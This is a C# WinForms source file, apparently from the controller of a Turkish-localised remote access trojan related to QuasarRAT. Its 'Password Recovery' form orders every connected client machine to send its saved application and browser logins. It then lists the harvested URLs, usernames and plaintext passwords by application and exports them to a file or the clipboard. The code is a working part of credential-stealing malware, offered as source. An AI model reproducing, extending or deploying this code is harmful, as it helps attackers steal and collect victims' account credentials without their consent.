using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using xServer.KuuhakuCekirdek.Veri;
using xServer.KuuhakuCekirdek.Yardımcılar;
using xServer.KuuhakuCekirdek.Ağ;
using xServer.KuuhakuCekirdek.Paketler.ServerPaketleri;


namespace xServer.Formlar
{
    public partial class FrmŞifreKurtarımı : Form
    {
        private readonly object _addingLock = new object();
        private readonly Client[] _clients;
        private readonly KurtarılanHesaplar _noResultsFound;

        public FrmŞifreKurtarımı(Client[] connectedClients)
        {
            _clients = connectedClients;
            foreach (Client client in _clients)
            {
                if (client == null || client.Value == null) continue;
                client.Value.FrmPass = this;
            }

            InitializeComponent();
            Text = PencereYardımcısı.GetWindowTitle("Şifre Kurtarımı", _clients.Length);

            txtFormat.Text = Ayarlar.SaveFormat;

            _noResultsFound = new KurtarılanHesaplar
            {
                Application = "Hiçbir Sonuç BUlunamadı",
                URL = "N/A",
                Username = "N/A",
                Password = "N/A"
            };
        }

        private void FrmPasswordRecovery_Load(object sender, EventArgs e)
        {
            RecoverPasswords();
        }

        private void FrmPasswordRecovery_FormClosing(object sender, FormClosingEventArgs e)
        {
            Ayarlar.SaveFormat = txtFormat.Text;
            foreach (Client client in _clients)
            {
                if (client == null || client.Value == null) continue;
                client.Value.FrmPass = null;
            }
        }

        #region Group Methods

        private ListViewGroup GetGroupFromApplication(string app)
        {
            ListViewGroup lvg = null;
            Invoke(new MethodInvoker(delegate
            {
                foreach (var @group in lstPasswords.Groups.Cast<ListViewGroup>().Where(@group => @group.Header == app))
                {
                    lvg = @group;
                }
            }));
            return lvg;
        }

        #endregion

        #region Public Members

        public void RecoverPasswords()
        {
            clearAllToolStripMenuItem_Click(null, null);

            var req = new GetPasswords();
            foreach (var client in _clients.Where(client => client != null))
                req.Execute(client);
        }

        public void AddPasswords(KurtarılanHesaplar[] accounts, string identification)
        {
            try
            {
                lock (_addingLock)
                {
                    var items = new List<ListViewItem>();

                    foreach (var acc in accounts)
                    {
                        var lvi = new ListViewItem {Tag = acc, Text = identification};

                        lvi.SubItems.Add(acc.URL);
                        lvi.SubItems.Add(acc.Username);
                        lvi.SubItems.Add(acc.Password); 

                        var lvg = GetGroupFromApplication(acc.Application);

                        if (lvg == null)
                        {
                            lvg = new ListViewGroup
                            {
                                Name = acc.Application.Replace(" ", string.Empty),
                                Header = acc.Application
                            };
                            Invoke(new MethodInvoker(() => lstPasswords.Groups.Add(lvg)));
                        }

                        lvi.Group = lvg;
                        items.Add(lvi);
                    }

                    Invoke(new MethodInvoker(() => { lstPasswords.Items.AddRange(items.ToArray()); }));
                    UpdateRecoveryCount();
                }

                if (accounts.Length == 0)
                {
                    var lvi = new ListViewItem {Tag = _noResultsFound, Text = identification};

                    lvi.SubItems.Add(_noResultsFound.URL);
                    lvi.SubItems.Add(_noResultsFound.Username);
                    lvi.SubItems.Add(_noResultsFound.Password);

                    var lvg = GetGroupFromApplication(_noResultsFound.Application);

                    if (lvg == null)
                    {
                        lvg = new ListViewGroup
                        {
                            Name = _noResultsFound.Application,
                            Header = _noResultsFound.Application
                        };
                        Invoke(new MethodInvoker(() => lstPasswords.Groups.Add(lvg)));
                    }

                    lvi.Group = lvg;
                    Invoke(new MethodInvoker(() => { lstPasswords.Items.Add(lvi); }));
                }
            }
            catch
            {
            }
        }

        #endregion

        #region Private Members

        private void UpdateRecoveryCount()
        {
            Invoke(
                new MethodInvoker(
                    () => groupBox1.Text = string.Format("Bulunan Hesaplar [ {0} ]", lstPasswords.Items.Count)));
        }

        private string ConvertToFormat(string format, KurtarılanHesaplar login)
        {
            return format
                .Replace("APP", login.Application)
                .Replace("URL", login.URL)
                .Replace("ID", login.Username)
                .Replace("ŞİFRE", login.Password);
        }

        private StringBuilder GetLoginData(bool selected = false)
        {
            StringBuilder sb = new StringBuilder();
            string format = txtFormat.Text;

            if (selected)
            {
                foreach (ListViewItem lvi in lstPasswords.SelectedItems)
                {
                    sb.Append(ConvertToFormat(format, (KurtarılanHesaplar) lvi.Tag) + "\n");
                }
            }
            else
            {
                foreach (ListViewItem lvi in lstPasswords.Items)
                {
                    sb.Append(ConvertToFormat(format, (KurtarılanHesaplar) lvi.Tag) + "\n");
                }
            }

            return sb;
        }

        #endregion

        #region Menu

        #region Saving

        #region File Saving

        private void saveAllToolStripMenuItem_Click(object sender, EventArgs e)
        {
            StringBuilder sb = GetLoginData();
            using (var sfdPasswords = new SaveFileDialog())
            {
                if (sfdPasswords.ShowDialog() == DialogResult.OK)
                {
                    File.WriteAllText(sfdPasswords.FileName, sb.ToString());
                }
            }
        }

        private void saveSelectedToolStripMenuItem_Click(object sender, EventArgs e)
        {
            StringBuilder sb = GetLoginData(true);
            using (var sfdPasswords = new SaveFileDialog())
            {
                if (sfdPasswords.ShowDialog() == DialogResult.OK)
                {
                    File.WriteAllText(sfdPasswords.FileName, sb.ToString());
                }
            }
        }

        #endregion

        #region Clipboard Copying

        private void copyAllToolStripMenuItem_Click(object sender, EventArgs e)
        {
            var sb = GetLoginData();

            PanoYardımcısı.SetClipboardText(sb.ToString());
        }

        private void copySelectedToolStripMenuItem_Click(object sender, EventArgs e)
        {
            StringBuilder sb = GetLoginData(true);

            PanoYardımcısı.SetClipboardText(sb.ToString());
        }

        #endregion

        #endregion

        #region Misc

        private void refreshToolStripMenuItem_Click(object sender, EventArgs e)
        {
            RecoverPasswords();
        }

        private void clearAllToolStripMenuItem_Click(object sender, EventArgs e)
        {
            lock (_addingLock)
            {
                lstPasswords.Items.Clear();
                lstPasswords.Groups.Clear();

                UpdateRecoveryCount();
            }
        }

        private void clearSelectedToolStripMenuItem_Click(object sender, EventArgs e)
        {
            for (int i = 0; i < lstPasswords.SelectedItems.Count; i++)
            {
                lstPasswords.Items.Remove(lstPasswords.SelectedItems[i]);
            }
        }

        #endregion

        private void txtFormat_TextChanged(object sender, EventArgs e)
        {

        }

        #endregion
    }
}